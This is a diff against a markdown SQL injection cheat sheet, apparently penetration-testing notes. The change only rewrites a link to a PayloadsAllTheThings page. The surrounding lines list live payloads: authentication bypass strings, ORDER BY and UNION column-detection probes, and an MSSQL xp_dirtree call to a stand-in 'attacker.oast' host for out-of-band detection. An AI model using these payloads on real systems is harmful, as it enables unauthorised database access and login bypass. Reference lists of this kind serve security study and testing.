@@ -222,7 +222,7 @@ exec master..xp_dirtree '\\attacker.oast\\a'
 | **Auth Bypass**                                                                                                                            |                                                      |
 | `admin' or '1'='1`                                                                                                                         | Basic Auth Bypass                                    |
 | `admin')-- -`                                                                                                                              | Basic Auth Bypass With comments                      |
-| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)              |                                                      |
+| [[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection#authentication-bypass]]              |                                                      |
 | **Union Injection**                                                                                                                        |                                                      |
 | `' order by 1-- -`                                                                                                                         | Detect number of columns using `order by`            |
 | `cn' UNION select 1,2,3-- -`                                                                                                               | Detect number of columns using Union injection       |
